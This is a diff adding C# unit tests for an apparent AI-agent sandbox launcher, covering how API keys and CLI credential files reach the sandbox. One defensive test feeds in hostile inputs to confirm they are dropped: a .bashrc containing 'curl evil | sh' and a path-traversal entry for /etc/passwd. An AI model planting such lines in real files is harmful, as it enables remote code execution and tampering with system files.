@@ -49,6 +49,30 @@ public sealed class SandboxSecretsMappingTests
     }
 
     [Fact]
+    public void CustomExtraEnv_RidesTheSameEnvFile_ForInteractiveLoginClis()
+    {
+        // The opencode case: no declared apiKeyEnvVar, but the user's custom llm_env_* keys inject.
+        var secrets = SandboxAgentLauncher.BuildSecrets(null, Marker("opencode", null),
+            new System.Collections.Generic.Dictionary<string, string> { ["OPENROUTER_API_KEY"] = "sk-or-1" });
+
+        Assert.Equal("sk-or-1", secrets.AgentEnv["OPENROUTER_API_KEY"]);
+    }
+
+    [Fact]
+    public void CustomExtraEnv_NeverOverridesTheAdaptersDeclaredKey()
+    {
+        var secrets = SandboxAgentLauncher.BuildSecrets("sk-real", Marker("codex", "OPENAI_API_KEY"),
+            new System.Collections.Generic.Dictionary<string, string>
+            {
+                ["OPENAI_API_KEY"] = "sk-custom-shadow",
+                ["OPENROUTER_API_KEY"] = "sk-or-1",
+            });
+
+        Assert.Equal("sk-real", secrets.AgentEnv["OPENAI_API_KEY"]);
+        Assert.Equal("sk-or-1", secrets.AgentEnv["OPENROUTER_API_KEY"]);
+    }
+
+    [Fact]
     public void MarkerRoundTrip_CarriesTheEnvVar()
     {
         var json = InstalledAdapterMarker.Serialize(Marker("codex", "OPENAI_API_KEY"));
@@ -67,5 +91,70 @@ public sealed class SandboxSecretsMappingTests
 
         Assert.NotNull(back);
         Assert.Null(back!.ApiKeyEnvVar);
+    }
+
+    // ---- CLI login persistence: the credential files that may reach the jail ----------------------
+
+    private static InstalledAdapterMarker MarkerWithCredentialPaths(params string[] paths) =>
+        new("claude-code", "1.0.0", new[] { "/opt/mainguard/adapters/bin/claude" },
+            "ANTHROPIC_API_KEY", EgressHosts: null, CredentialPaths: paths);
+
+    private static Mainguard.Agents.Agents.Sandbox.SandboxCredentialFile File(string path, string content = "x") =>
+        new(path, System.Text.Encoding.UTF8.GetBytes(content));
+
+    [Fact]
+    public void FilterCliCredentials_KeepsOnlyAdapterDeclaredPaths()
+    {
+        // The client names paths on the wire — anything the installed adapter didn't declare is
+        // dropped, or a compromised client could seed arbitrary agent-home files at spawn.
+        var kept = SandboxAgentLauncher.FilterCliCredentials(
+            new[]
+            {
+                File(".claude/.credentials.json"),
+                File(".bashrc", "curl evil | sh"),
+                File(".claude/../../etc/passwd", "root::0:0"),
+            },
+            MarkerWithCredentialPaths(".claude/.credentials.json", ".claude.json"));
+
+        var file = Assert.Single(kept!);
+        Assert.Equal(".claude/.credentials.json", file.HomeRelativePath);
+    }
+
+    [Fact]
+    public void FilterCliCredentials_NoMarkerOrNoDeclaredPaths_NothingReachesTheJail()
+    {
+        var supplied = new[] { File(".claude/.credentials.json") };
+
+        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(supplied, adapter: null));
+        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(supplied, Marker("claude-code", "ANTHROPIC_API_KEY")));
+    }
+
+    [Fact]
+    public void FilterCliCredentials_EmptyContentIsDropped()
+    {
+        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(
+            new[] { new Mainguard.Agents.Agents.Sandbox.SandboxCredentialFile(".claude.json", System.Array.Empty<byte>()) },
+            MarkerWithCredentialPaths(".claude.json")));
+    }
+
+    [Fact]
+    public void BuildSecrets_CarriesTheFilteredCredentialFiles()
+    {
+        var secrets = SandboxAgentLauncher.BuildSecrets(
+            "sk-test", MarkerWithCredentialPaths(".claude/.credentials.json"),
+            cliCredentials: new[] { File(".claude/.credentials.json", "{\"token\":\"t\"}") });
+
+        var file = Assert.Single(secrets.CliCredentialFiles!);
+        Assert.Equal(".claude/.credentials.json", file.HomeRelativePath);
+    }
+
+    [Fact]
+    public void MarkerRoundTrip_CarriesCredentialPaths()
+    {
+        var back = InstalledAdapterMarker.TryDeserialize(
+            InstalledAdapterMarker.Serialize(MarkerWithCredentialPaths(".claude/.credentials.json", ".claude.json")));
+
+        Assert.NotNull(back);
+        Assert.Equal(new[] { ".claude/.credentials.json", ".claude.json" }, back!.CredentialPaths);
     }
 }
